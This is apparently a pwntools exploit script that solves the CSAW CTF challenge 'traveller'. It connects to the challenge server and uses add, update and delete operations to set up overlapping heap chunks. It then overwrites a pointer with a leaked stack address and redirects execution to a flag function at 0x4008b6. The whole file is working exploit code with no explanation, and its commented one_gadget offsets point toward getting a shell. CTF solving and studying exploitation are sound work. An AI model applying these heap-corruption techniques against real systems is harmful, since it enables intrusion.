from pwn import *

#r = process("./traveller")
#r = remote("127.0.0.1", 8000)
r = remote("pwn.chal.csaw.io", 1003)

def Add(index, content):
	print r.recv()
	r.sendline("1")
	print r.recvuntil("\n")
	print r.recvuntil("\n")
	r.sendline(str(index))
	print r.recv()
	r.sendline(content)

def Update(index, content):
	print r.recvuntil("\n")
	r.sendline("2")
	print r.recv()
	r.sendline(str(index))
	r.sendline(content)

def Delete(index):
	print r.recv()
	r.sendline("3")
	r.sendline(str(index))

def Check(index):
	print r.recv()
	r.sendline("4")
	print r.recv()
	r.sendline(str(index))

#one_gadget = 0x45216
#one_gadget = 0x4526a
#one_gadget = 0xf02a4
#one_gadget = 0xf1147

print r.recvuntil("\n")
print r.recvuntil("\n")
#print r.recvuntil("\n")
stack_addr = r.recvuntil("\n")
stack_addr = int(stack_addr, 16)
print "stack address: " + hex(stack_addr)

Add(3, "Z"*0x120)
Add(3, "A"*0x120)
Delete(0)
#gdb.attach(r)

bypass_sec = "B"*0x1f0 + p64(0x200)
Add(5, bypass_sec)
Add(3, "C"*0x120)
#gdb.attach(r)
Delete(1)
#gdb.attach(r)

Update(0, "A"*0x128)
#gdb.attach(r)
Add(2, "E"*0x108)
Add(1, "F"*0x78)
#gdb.attach(r)
Delete(2)
Delete(1)

payload = "D"*0x120 + p64(stack_addr - 0x14) + p64(0x8) + "D"*0x20
Add(4, payload)
flag_addr = 0x4008b6
Update(1, p64(flag_addr))
#gdb.attach(r)
Check(1)
